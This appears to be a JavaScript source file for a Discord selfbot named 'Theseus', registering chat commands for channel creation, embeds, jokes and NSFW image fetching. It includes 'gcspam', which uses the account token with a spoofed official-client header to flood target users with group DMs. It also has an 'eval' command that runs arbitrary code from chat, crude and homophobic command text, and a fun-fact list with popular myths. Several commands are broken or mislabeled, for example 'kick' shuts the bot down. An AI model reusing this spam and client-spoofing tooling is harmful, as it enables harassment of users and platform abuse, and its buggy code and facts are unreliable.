                    if(config.log.failed) l(`${'COMMAND (FAILURE)'.bgRed.black} {{user}} - {{command}} ({{%ifError}})`.replace(`{{user}}`, msg.author.tag).replace(`{{command}}`, msg.content.split(' ')[0]).replace(`{{%ifError}}`, `command doesn't exist`));
                    try {
                        msg.delete();
                    }
                    catch (err) {
                        var doNull = () => {return null}
                        doNull();
                    }
                }
                return;
            }
            bot.commands.tap(
                (cmd) => {
                    if(msg.content.split(' ')[0] == `${config.prefix}${cmd.name}`){
                        if(cmd.type == 1 && msg.guild == null) {msg.channel.send(embed("danger", "Theseus | Error", "This administrator command needs to be executed in a server you have permission in."));return;}
                        if(cmd.dangerous) {
                            if(!config.allowDangerous) {
                                msg.channel.send(embed("danger", "Theseus | Error", "This command is classified as dangerous! You may not use this command until you enable **\"Dangerous Commands\"** on your Theseus portal configuration."));
                                return;
                            }
                        } 
                        if(cmd.arguments == true) {
                            if(a.length >= cmd.argsize) {
                                if(checkuser() == true) {
                                    try {
                                        msg.delete();
                                    }
                                    catch (err) {
                                        var doNull = () => {return null}
                                        doNull();
                                    }
                                    cmd.execute(msg, _, bot);
                                }
                            }
                            else {
                                if(checkuser()) {
                                    try {
                                        msg.delete();
                                    }
                                    catch (err) {
                                        var doNull = () => {return null}
                                        doNull();
                                    }
                                    m[gc][$](embed(config.embedColors.danger, "Syntax Error: Missing or insufficient arguments", config.prefix+cmd.usage));
                                }
                            }
                        }
                        else {
                            if(checkuser() == true) {
                                try {
                                    msg.delete();
                                }
                                catch (err) {
                                    var doNull = () => {return null}
                                    doNull();
                                }
                                cmd.execute(msg, _, bot);
                            }
                        }
                    }
                }
            );
            return;
        }
    });

        l("Loading commands, please wait...");
        l(' ');
        var didSend = false;
        l(`Authenticated as ${user.username} | Prefix: ${config.prefix} | Discord User: ${bot.user.username}`)

        bot.commands.set("wavespam", {
            originalcmd: true,
            name: "wavespam",
            description: "spam waves at people",
            type: 0,
            usage: "wavespam",
            arguments: false,
            argsize: 0,
            async execute(msg, args, bot) {
//                msg.channel.messages
            }
        })

        bot.commands.set("cmdreload", {
            originalcmd: true,
            name: "cmdreload",
            description: "reload commands",
            type: 0,
            usage: "cmdreload",
            arguments: false,
            argsize: 0,
            async execute(msg, args, bot) {
                var newMessage = (await msg.channel.send(embed(
                    config.embedColors.info,
                    "Theseus | Preparing reload...",
                    "",
                )));
                
                let i = 0;
                const customCmd = fs.readdirSync(path.join(Envdata, ".theseus", "commands")).filter(file => file.endsWith('.js'));
                for (const file of customCmd) {
                  if(!file.endsWith(".js")){return;}
                  const command = require(path.join(Envdata, ".theseus", "commands", file));
                  if(!command.name || !command.description || !command.type || !command.usage || !command.execute) {
                      System.text(`${"[API]".magenta} Your command at ${file} is missing something! Please make sure you have the following (name, description, type, usage, and execute)`);
                  }
                  else {
                      if (file.startsWith("-")) {
                          if(config.logAllRegisteredCommands) l(`${"-".red} ${config.prefix}${command.name}(${file.replace('-','')}) ignored`);
                      }
                      else {
                          if(command.name){
                              if(config.logAllRegisteredCommands) l(`${"+".green} ${config.prefix}${command.name}(${file}) registered`);
                              // set a new item in the Collection
                              // with the key as the command name and the value as the exported module
                              bot.commands.set(command.name, command);
                              i++;
                            }
                            else {
                              if(config.logAllRegisteredCommands) l(`${"-".red} ${config.prefix}${command.name}(${file}) error`);
                            }
                        }    
                  }
                }
                newMessage.edit(embed(
                    config.embedColors.success,
                    "Theseus | Reloaded custom commands",
                    `Reloaded a total of ${i} command(s)!`,
                ));
            }
        })
        
        bot.commands.set("kick", {
            originalcmd: true,
            name: "kick",
            type: 0,
            description: "issue a kick against a user",
            usage: "kick <@user|userid> [reason]",
            arguments: false,
            argsize: 0,
            async execute(msg, args, bot) {
                System.text("Shutting down: stopbot command executed.");
                msg.channel.send(embed(bot.embedColors("success"), "Theseus", "Goodbye!"));
                await delay(1000);
                process.exit();
            }
        });

        bot.commands.set("stagechannel", {
            originalcmd: true,
            name: 'stagechannel',
            type: 1,
            dangerous: true,
            description: 'Create a stagechannel channel',
            usage: "stagechannel <name>",
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                if(!msg.guild.features.includes("COMMUNITY")) {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Error", "Failed to make a channel! This is a 'community only' channel, enable it in your server settings."));return;}
                if(args.join("-") > 16) {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Failed usage", "You may only have 16 characters in a channel!"));return;}
                theseus_request(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`, {name: args.join("-"), permission_overwrites: [], type: 13}).then(chnl => {
                    msg.channel.send(embed(bot.embedColors("success"), "Theseus | Success", `Your channel has been created: <#${chnl.id}> (${chnl.id})`));
                }).catch(() => {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Error", "Failed to make a channel! Do you have permission?"))});
            }
        });        
        bot.commands.set("newschannel", {
            originalcmd: true,
            name: 'newschannel',
            type: 1,
            description: 'Create a news channel',
            usage: "newschannel <name>",
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                if(!msg.guild.features.includes("COMMUNITY")) {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Error", "Failed to make a channel! This is a 'community only' channel, enable it in your server settings."));return;}
                if(args.join("-") > 16) {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Failed usage", "You may only have 16 characters in a channel!"));return;}
                msg.guild.createChannel(args.join("-"), {type: "news"}).then(chnl => {
                    msg.channel.send(embed(bot.embedColors("success"), "Theseus | Success", `Your channel has been created: <#${chnl.id}> (${chnl.id})`));
                }).catch(() => {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Error", "Failed to make a channel! Do you have permission?"))});
            }
        });        
        bot.commands.set("textchannel", {
            originalcmd: true,
            name: 'textchannel',
            type: 1,
            description: 'Create a new text channel',
            usage: "textchannel <name>",
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                if(args.join("-") > 16) {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Failed usage", "You may only have 16 characters in a channel!"));return;}
                msg.guild.createChannel(args.join("-"), {type: "text"}).then(chnl => {
                    msg.channel.send(embed(bot.embedColors("success"), "Theseus | Success", `Your channel has been created: <#${chnl.id}> (${chnl.id})`));
                }).catch(() => {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Error", "Failed to make a channel! Do you have permission?"))});
            }
        });        
        
        bot.commands.set("voicechannel", {
            originalcmd: true,
            name: 'voicechannel',
            type: 1,
            description: 'Create a new voice channel',
            usage: "voicechannel <name>",
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                if(args.join("-") > 16) {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Failed usage", "You may only have 16 characters in a channel!"));return;}
                msg.guild.createChannel(args.join("-"), {type: "voice"}).then(chnl => {
                    msg.channel.send(embed(bot.embedColors("success"), "Theseus | Success", `Your channel has been created: <#${chnl.id}> (${chnl.id})`));
                }).catch(() => {msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Error", "Failed to make a channel! Do you have permission?"))});
            }
        });        
        
        bot.commands.set("ff", {
            originalcmd: true,
            name: 'ff',
            type: 3,
            description: 'Generate a fun fact for yourself',
            usage: "ff",
            arguments: false.valueOf,
            argsize: 0,
            execute(msg, args, bot) {
                var lst = [
                    "It is impossible for most people to lick their own elbow. (try it!)",
                    "A crocodile cannot stick its tongue out.","A shrimp's heart is in its head.",
                    "It is physically impossible for pigs to look up into the sky.",
                    "The \"sixth sick sheik's sixth sheep's sick\" is believed to be the toughest tongue twister in the English language.",
                    "If you sneeze too hard, you could fracture a rib.",
                    "Wearing headphones for just an hour could increase the bacteria in your ear by 700 times.",
                    "In the course of an average lifetime, while sleeping you might eat around 70 assorted insects and 10 spiders, or more.",
                    "Some lipsticks contain fish scales.",
                    "Cat urine glows under a black-light.",
                    "Like fingerprints, everyone's tongue print is different.",
                    "Rubber bands last longer when refrigerated.",
                    "There are 293 ways to make change for a dollar.",
                    "The average person's left hand does 56% of the typing (when using the proper position of the hands on the keyboard; Hunting and pecking doesn't count!).",
                    "A shark is the only known fish that can blink with both eyes.","The longest one-syllable words in the English language are \"scraunched\" and \"strengthed.\" Some suggest that \"squirreled\" could be included, but squirrel is intended to be pronounced as two syllables (squir-rel) according to most dictionaries. \"Screeched\" and \"strengths\" are two other long one-syllable words, but they only have 9 letters.","\"Dreamt\" is the only English word that ends in the letters \"mt\".",
                    "Almonds are a member of the peach family.",
                    "Maine is the only state that has a one-syllable name.",
                    "There are only four words in the English language which end in \"dous\": tremendous, horrendous, stupendous, and hazardous.",
                    "Los Angeles' full name is \"El Pueblo de Nuestra Senora la Reina de los Angeles de Porciuncula\"",
                    "A cat has 32 muscles in each ear.",
                    "An ostrich's eye is bigger than its brain.",
                    "Tigers have striped skin, not just striped fur.",
                    "In many advertisements, the time displayed on a watch is 10:10.",
                    "The characters Bert and Ernie on Sesame Street were named after Bert the cop and Ernie the taxi driver in Frank Capra's \"It's a Wonderful Life.\"",
                    "A dime has 118 ridges around the edge.",
                    "The giant squid has the largest eyes in the world.",
                    "Most people fall asleep in seven minutes.",
                    "\"Stewardesses\" is the longest word that is typed with only the left hand",
                    "Mint thin cookies slap",
                    "The Supreme Court has its own private fucking basketball court with the nickname \"the highest court in the land.\"",
                    "You have a better chance of getting into god damn Harvard instead of working for walmart according to acceptance rates.",
                    "hippopotomonstrosesquippedaliophobia which has a 36 characters ironically has the meaning of fear of long words.",
                    "It officially takes 364 licks to get to the center of a Tootsie Pop.",
                    "u r a q t b b ily (:x: homo, :white_check_mark: homies)",
                    "Cookie Monster's name is Sid. :)",
                    "China censored the word 'censorship'",
                    "Vending machines are bigger threats to humanity than sharks.",

                ];
                msg.channel.send(embed(
                    config.embedColors.info,
                    "Fun fact:",
                    lst[Math.floor(Math.random() * lst.length)],
                    "Bet you didn't know that... or you did, I don't fcking know."
                ))
            }
        })
        bot.commands.set("stopbot", {
            originalcmd: true,
            name: "stopbot",
            type: 0,
            description: "stop theseus bot from running (process.exit)",
            usage: "reload",
            arguments: false,
            argsize: 0,
            async execute(msg, args, bot) {
                System.text("Shutting down: stopbot command executed.");
                msg.channel.send(embed(bot.embedColors("success"), "Theseus", "Goodbye!"));
                await delay(1000);
                process.exit();
            }
        });
        bot.commands.set("reload", {
            originalcmd: true,
            name: "reload",
            type: 0,
            description: "tries to reload your configuration from the data server (automatically happens every 5 minutes)",
            usage: "reload",
            arguments: false,
            argsize: 0,
            async execute(msg, args, bot) {
                var newMessage = (await msg.channel.send(embed(
                    config.embedColors.info,
                    "Theseus | Preparing web client...",
                    "",
                    "Bloop; by that, I mean you can use the bot while it's doing this."
                )));
                newMessage.edit(embed(
                    config.embedColors.info,
                    "Theseus | Fetching configuration...",
                    "This may take a moment depending on your internet connection...",
                    "Bloop; by that, I mean you can use the bot while it's doing this."
                ))
                System.text("MANUAL CONFIGURATION REFRESH STARTED...".bgCyan.black);
                let getNewConfig = async () => {
                    var options = {headers: {'Content-Type': 'application/x-theseus.me+json'}};
                    let response = await axios.post(`https://theseus.me/api/v2/tunnels/configuration`, JSON.stringify({username: authentication.accountUsername, key: authentication.accountSecret}), options).catch();
            //        let response = {data: {result: "error", message: "SYSTEM_UPDATE_NEEDED"}}
                    let data = response.data;
                    return response;
                }
                getNewConfig().then(newC => {
                    if(JSON.stringify(newC.data) != JSON.stringify(config)) {
                        if(fs.existsSync(path.join(Envdata, ".theseus", "dsgd.key"))) {
                            newC.data.token = fs.readFileSync(path.join(Envdata, ".theseus", "dsgd.key"), {encoding:'utf8', flag:'r'});
                            config["token"] = fs.readFileSync(path.join(Envdata, ".theseus", "dsgd.key"), {encoding:'utf8', flag:'r'})
                        }
                
                        newMessage.edit(embed(
                            config.embedColors.success,
                            "Theseus | Successfully retrieved configuration",
                            "Yay, your new settings should have been applied and are now working",
                            "Any issues you got with this? Make a support inquiry at https://theseus.me/bsupport."
                        ))
                        System.text("CONFIGURATION CHANGES DETECTED, UPDATING CONFIGURATION".bgCyan.black);
                        config = newC.data;
                        bot.config = config;
                        System.text("SUCCESSFULLY UPDATED CONFIGURATION TO MATCH INTEGRITY");
                    } else {
                        newMessage.edit(embed(
                            config.embedColors.danger,
                            "Theseus | Successfully retrieved configuration",
                            "Looks like you didn't have any changes for us to apply! Try making a change then wait 5-20 seconds before trying again.",
                            "Any issues you got with this? Make a support inquiry at https://theseus.me/bsupport."
                        ))
                        System.text("NOTHING TO UPDATE!");
                    }
                })
                
            }
        })
        bot.commands.set("embedsay", {
            originalcmd: true,
            name: 'embedsay',
            type: 4,
            description: 'Say something... in an embed. It\'s not that special.',
            usage: "embedsay <text>",
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                msg.channel.send(embed(
                    config.embedColors.info,
                    args.join(" ")
                ))
            }            
        })
        bot.commands.set("conclr", {
            originalcmd: true,
            name: 'conclr',
            type: 4,
            description: 'Clear the bot console. (LOCAL ONLY)',
            usage: "conclr",
            arguments: false,
            argsize: 1,
            execute(msg, args, bot) {
                console.clear();
                console.log();
                console.log("")
                System.watermark(`████████╗██╗  ██╗███████╗███████╗███████╗██╗   ██╗███████╗   ███╗   ███╗███████╗\n╚══██╔══╝██║  ██║██╔════╝██╔════╝██╔════╝██║   ██║██╔════╝   ████╗ ████║██╔════╝\n   ██║   ███████║█████╗  ███████╗█████╗  ██║   ██║███████╗   ██╔████╔██║█████╗  \n   ██║   ██╔══██║██╔══╝  ╚════██║██╔══╝  ██║   ██║╚════██║   ██║╚██╔╝██║██╔══╝  \n   ██║   ██║  ██║███████╗███████║███████╗╚██████╔╝███████║██╗██║ ╚═╝ ██║███████╗\n   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝╚══════╝\n                                                                                `);
                System.text(`${currentsplash} | ${'Bot created by koda#9990'}`);
                System.watermark(`Authenticated as ${user.username} | Prefix: ${config.prefix} | Discord User: ${bot.user.username}`)
//                System.line(axMesa("\u2500\u2500\u2500[ LOG START ]", 16, config));
               System.line(axMesa("", 0, config));
            }            
        })
        bot.commands.set("cembedsay", {
            originalcmd: true,
            name: 'cembedsay',
            type: 4,
            description: 'Say something... in an embed. It\'s not that special. With more embed features!',
            usage: "cembedsay <color: #hex|danger|success|info> <title: space = _> <description>",
            arguments: true,
            argsize: 3,
            execute(msg, args, bot) {
                msg.channel.send(embed(
                    bot.embedColors(args.shift()),
                    args.shift().replace(/_/g, " "),
                    args.join(" ").replace(/_/g, " ")
                ))
            }            
        });
        bot.commands.set("jembedsay", {
            originalcmd: true,
            name: 'jembedsay',
            type: 4,
            description: 'Say something... in an embed. It\'s not that special. With more embed features!',
            usage: "jembedsay <JSON Object>",
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                var parsed = [];
                try{
                    var parsed = JSON.parse(args.join(" "));
                } catch(ex){
                    var parsed = embed(config.embedColors.danger, "Failed to parse embed JSON!", "Please make sure your JSON can be parsed correctly!")
                }
                msg.channel.send({embed: parsed})
            }            
        });
        bot.commands.set("kanye", {
            name: "kanye",
            description: '¯\\_(ツ)_/¯',
            type: 3,
            usage: "kanye",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://api.kanye.rest/');
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var quote = img.quote;
                msg.channel.send(embed(config.embedColors.info, quote, "- Kanye West"));
            }    
        })
        bot.commands.set("empty", {
            name: 'empty',
            description: 'sends an empty message',
            type: 4,
            usage: "empty",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            execute(msg, args, bot) {
                msg.channel.send("** **");
            }
        });
        bot.commands.set("dick", {
            name: 'dick',
            description: 'pull out the ruler and make some penis measurements',
            type: 3,
            usage: "dick <@user>",
            originalcmd: true,
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                if(msg.mentions.length != 0) {
                var count = Math.floor(1+(Math.random()*9));
                var balls = "8";
                for (let i = 0; i < count; i++) {
                    balls = balls + "=";                        
                }
                balls = balls + "D";
                    msg.channel.send(embed(bot.embedColors("info"), "Ruler results", `It looks like ${msg.mentions.users.first().username}'s penis has the length of ~${count} inch(s), heres a visual representation of this result:\n${balls}`))
                }
                else {
                    msg.channel.send(embed(bot.embedColors("danger"), "Error", `You gotta ping the person you wanna pull that ruler on :straight_ruler:`))
                }
            }
        })
        bot.commands.set("gcspam", {
            name: 'gcspam',
            description: 'spams group channels with a user and leaves them shortly after',
            type: 4,
            usage: "gcspam <userid1> <userid2>",
            originalcmd: true,
            arguments: false,
            argsize: 2,
            async execute(msg, args, bot) {
                var lgc = [];
                let makeGC = async () => {
                    try {
                        let response = await axios.post('https://discord.com/api/v9/users/@me/channels', {recipients: [args[0], args[1]]}, {headers: {
                            "Authorization": config.token,
                            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA1NjA4LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
                        }});
                        let data = response.data;
                        return data;    
                    }
                    catch (ex){
                        return [];
                    }
                }
                let deleteGC = async (id) => {
                    let response = await axios.delete(`https://discord.com/api/v9/channels/${id}`, {headers: {
                        "Authorization": config.token,
                        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA1NjA4LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
                    }});
                    let data = response.data;
                    return data;
                }
                for (let i = 0; i < 30; i++) {
                    try {
                        let gc = await makeGC();
                        lgc.push(gc.id);
                    }
                    catch (ex){
                        console.log("created all groups possible");
                        for (let i = 0; i < 30; i++) {
                            deleteGC(lgc.id);
                        }
                        continue;
                    }
                }
                


            }
        });
        bot.commands.set("ghostping", {
            name: 'ghostping',
            description: 'ghost ping a user/role',
            type: 4,
            usage: "ughostping <@user/@role>",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            execute(msg, args, bot) {}
        });
        bot.commands.set("animetrash", {
            name: 'animetrash',
            description: '¯\\_(ツ)_/¯',
            type: 3,
            usage: "animetrash <url | @user>",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                var var1 = args[0];
                let img = await theseus_fetch("https://nekobot.xyz/api/imagegen?type=trash&url="+args[0]);
                msg.channel.send(embed(config.embedColors.info, "True though", "", "", "", img.message));
            }    
        })

        bot.commands.set("qr", {
            name: 'qr',
            description: 'generate a qr code from a URL',
            type: 4,
            usage: "qr <url>",
            originalcmd: true,
            arguments: true,
            argsize: 1,
            async execute(msg, args, bot) {
                let dataset = args.join("%20");
                if(args.join(" ").includes("http")) {
                    let getImg = async () => {
                        let response = await axios.get('https://theseus.me/api/v2/fun/qurl?url='+args.join("%20"));
                        let data = response.data;
                        return data;
                    }
                    let dataset = await getImg();    
                }
                msg.channel.send(embed(
                    bot.embedColors("info"),
                    "Here you go!",
                    "You can send this anywhere you would like",
                    "credit to qrserver.com",
                    "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data="+dataset
                ));
            }    
        })
        bot.commands.set("8ball", {
            originalcmd: true,
            name: '8ball',
            type: 3,
            description: 'ask the 8ball a question',
            usage: "8ball <text>",
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                var random=Math.floor(Math.random() * lang['8ball']['length']);
                msg.channel.send(embed(config.embedColors.info,`${msg.content.replace(`${config.prefix}8ball `, '')}`,`${lang['8ball'][random]} :8ball:`));
            }
        });
        bot.commands.set("activity", {
            name: 'activity',
            originalcmd: true,
            type: 4,
            description: 'change your current status',
            usage: "activity <type> <message>\nFor the type list, enter `activity help ?`\nTo clear, enter `activity none clear`",
            arguments: true,
            argsize: 2,
            async execute(msg, args, bot) {
                var type = args.shift();
                var message = args.join(" ");
                switch ( type.toLowerCase() ) {
                    case "playing":
                        bot.user.setActivity(message, {type: "PLAYING"}).then(() => {msg.channel.send(new RichEmbed().setTitle("Success").setColor(config.embedColors.success).setDescription("You have successfully set your activity to `playing " + message + "`"))});
                        break;
                    case "listening":
                        bot.user.setActivity(message, {type: "LISTENING"}).then(() => {msg.channel.send(new RichEmbed().setTitle("Success").setColor(config.embedColors.success).setDescription("You have successfully set your activity to `listening to " + message + "`"))});
                        break;
                    case "watching":
                        bot.user.setActivity(message, {type: "WATCHING"}).then(() => {msg.channel.send(new RichEmbed().setTitle("Success").setColor(config.embedColors.success).setDescription("You have successfully set your activity to `watching " + message + "`"))});
                        break;
                    case "none":
                        bot.user.setActivity("").then(() => {msg.channel.send(new RichEmbed().setTitle("Success").setColor(config.embedColors.success).setDescription("You have successfully removed your activity status"))});
                        break;
                    case "help":
                        msg.channel.send(new RichEmbed().setTitle("Allowed types").setColor(config.embedColors.info).setDescription("```\nPLAYING\nLISTENING\nWATCHING```"));
                        break;``
                    default:
                        msg.channel.send(new RichEmbed().setTitle("Error").setColor(config.embedColors.danger).setDescription("Invalid type! Please select from the following:\n```\nPLAYING\nLISTENING\nWATCHING```"));
                        break;
                }
            }
        });
        bot.commands.set("trap", {
            name: 'trap',
            description: 'traps arent gay',
            type: 2,
            usage: "trap",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://api.waifu.pics/nsfw/trap');
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.url;
                msg.channel.send(embed(config.embedColors.info, `It's a trap!`, ``, ``, ``, url)).then( _msg => {
                    if(_msg.embeds == 0) {
                        _msg.delete();
                        _msg.channel.send(embed(config.embedColors.danger, `Something went wrong!`, `A user in this guild/group/dm channel has their settings turned on to prevent seeing NSFW content! Could not post image`));
                    }
                } );
            }    
        })
        bot.commands.set("ass", {
            name: 'ass',
            description: 'get some ass',
            type: 2,
            usage: "ass",
            arguments: false,
            originalcmd: true,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://nekobot.xyz/api/image?type=ass');
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.message;
                msg.channel.send(embed(config.embedColors.info, `Here's some ass`, ``, ``, ``, url)).then( _msg => {
                    if(_msg.embeds == 0) {
                        _msg.delete();
                        _msg.channel.send(embed(config.embedColors.danger, `Something went wrong!`, `A user in this guild/group/dm channel has their settings turned on to prevent seeing NSFW content! Could not post image`));
                    }
                } );
            }    
        });
        bot.commands.set("boobs", {
            name: 'boobs',
            description: 'get a random picture nsfw picture of booba',
            type: 2,
            usage: 2,
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://nekobot.xyz/api/image?type=boobs');
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.message;
                msg.channel.send(embed(config.embedColors.info, `Here's some boobs`, ``, ``, ``, url)).then( _msg => {
                    if(_msg.embeds == 0) {
                        _msg.delete();
                        _msg.channel.send(embed(config.embedColors.danger, `Something went wrong!`, `A user in this guild/group/dm channel has their settings turned on to prevent seeing NSFW content! Could not post image`));
                    }
                } );
        
            }
        });
        bot.commands.set("cbot", {
            name: "cbot",
            description: 'speak to the one and only, cleverbot',
            type: 2,
            usage: "cbot <text>",
            originalcmd: true,
            arguments: true,
            argsize: 1,
            async execute(msg, args, bot) {
                let speakToBot = async () => {
                    let response = await axios.get('https://www.cleverbot.com/getreply?key=hass');
                    let data = response.data;
                    return data;
                }
                let img = await speakToBot();
            }
        });

        bot.commands.set("hentaiass", {
            name: 'hentaiass',
            description: 'get a random hentai picture of ass',
            type: 2,
            usage: "hentaiass",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://nekobot.xyz/api/image?type=hass');
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.message;
                msg.channel.send(embed(config.embedColors.info, `Right here is the hentai ass`, ``, ``, ``, url)).then( _msg => {
                    if(_msg.embeds == 0) {
                        _msg.delete();
                        _msg.channel.send(embed(config.embedColors.danger, `Something went wrong!`, `A user in this guild/group/dm channel has their settings turned on to prevent seeing NSFW content! Could not post image`));
                    }
                } );
        
            }
        });
        // bot.commands.set("midriff", {
        //     name: 'midriff',
        //     description: 'get some anime',
        //     type: "NSFW",
        //     usage: "midriff",
        //     originalcmd: true,
        //     arguments: false,
        //     argsize: 1,
        //     async execute(msg, args, bot) {
        //         let getImg = async () => {
        //             let response = await axios.get('https://nekobot.xyz/api/image?type=midriff');
        //             let data = response.data;
        //             return data;
        //         }
        //         let img = await getImg();
        //         var url = img.message;
        //         msg.channel.send(embed(config.embedColors.info, `anime tit region pic`, ``, ``, ``, url)).then( _msg => {
        //             if(_msg.embeds == 0) {
        //                 _msg.delete();
        //                 _msg.channel.send(embed(config.embedColors.danger, `Something went wrong!`, `A user in this guild/group/dm channel has their settings turned on to prevent seeing NSFW content! Could not post image`));
        //             }
        //         } );
        
        //     }
        // });
        bot.commands.set("neko", {
            name: 'neko',
            description: 'cat gorls',
            type: 2,
            usage: "neko",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://nekobot.xyz/api/image?type=hneko');
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.message;
                msg.channel.send(embed(config.embedColors.info, `here is cat gorl`, ``, ``, ``, url)).then( _msg => {
                    if(_msg.embeds == 0) {
                        _msg.delete();
                        _msg.channel.send(embed(config.embedColors.danger, `Something went wrong!`, `A user in this guild/group/dm channel has their settings turned on to prevent seeing NSFW content! Could not post image`));
                    }
                } );
        
            }
        });
        bot.commands.set("pussy", {
            name: 'pussy',
            description: 'some uncensored pussy',
            type: 2,
            usage: "pussy",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://cataas.com/cat');
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img;
                msg.channel.send(embed(config.embedColors.info, `heres some uncensored pussy`, ``, ``, ``, "https://cataas.com/cat?koda-cat=" + Math.floor(Math.random() * 182388874172654))).then( _msg => {
                    if(_msg.embeds == 0) {
                        _msg.delete();
                        _msg.channel.send(embed(config.embedColors.danger, `Something went wrong!`, `A user in this guild/group/dm channel has their settings turned on to prevent seeing NSFW content! Could not post image`));
                    }
                } );
        
            }
        });
        bot.commands.set("closealldms", {
            name: 'closealldms',
            description: 'close every dm in your discord\nthis will not delete any of your messages',
            type: 4,
            usage: "closealldms",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                msg.channel.send(embed(config.embedColors.info, `Attempting to close all dm's! No messages will be deleted.`));
                let i = 0;
                bot.channels.tap(guild => {
                    if(guild.type=='dm'){guild.delete()}                
                });
            }
        });
        bot.commands.set("clyde", {
            name: 'clyde',
            description: 'force clyde to speak of anything you wish at your whim',
            usage: "clyde <text>",
            originalcmd: true,
            type: 3,
            arguments: true,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://nekobot.xyz/api/imagegen?type=clyde&text=' + args.join("+"));
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.message;
                msg.channel.send("", {files: [url]});
        
            }
        });
        bot.commands.set("coinflip", {
            name: 'coinflip',
            description: 'flip a coin and get heads or tails\ncompletely 50/50 chance',
            usage: "coinflip",
            type: 3,
            arguments: false,
            originalcmd: true,
            argsize: 1,
            execute(msg, args, bot) {
                switch(randmax(2)) {
                    case 1:
                        msg.channel.send(embed(config.embedColors.info, `:coin: The coin landed on heads`));
                        break;
                    case 2:
                        msg.channel.send(embed(config.embedColors.info, `:coin: The coin landed on tails`));
                        break;
                }
            }
        });
        bot.commands.set("eval", {
            name: 'eval',
            description: 'execute javascript via chat command',
            usage: "eval <javascript>",
            type: 0,
            originalcmd: true,
            arguments: true,
            argsize: 1,
            dangerous: true,
            execute(msg, args, bot) {
                var exec = args.join(" ");
                try {
                    var embed = new RichEmbed()
                    .setColor(config.embedColors.success)
                    .setTitle(`Evaluation Complete`)
                    .addField(`Execution`, `\`\`\`${exec}\`\`\``)
                    .addField(`Result`, `\`\`\`${eval(exec)}\`\`\``)
                    msg.channel.send(embed);
                }
                catch (err) {
                    var embed = new RichEmbed()
                    .setColor(config.embedColors.danger)
                    .setTitle(`Evaluation Failed`)
                    .addField(`Execution`, `\`\`\`${exec}\`\`\``)
                    .addField(`Result`, `\`\`\`${err}\`\`\``)
                    msg.channel.send(embed);
                }
            }
        });
        bot.commands.set("faketweet", {
            name: 'faketweet',
            description: 'make a fake tweet with any username or password',
            usage: "faketweet <twtusername> <text>",
            arguments: true,
            originalcmd: true,
            type: 3,
            argsize: 2,
            async execute(msg, args, bot) {
                let twitter = args.shift();
                let getImg = async () => {
                    let response = await axios.get('https://nekobot.xyz/api/imagegen?type=tweet&username=' + twitter + "&text=" + args.join(" "));
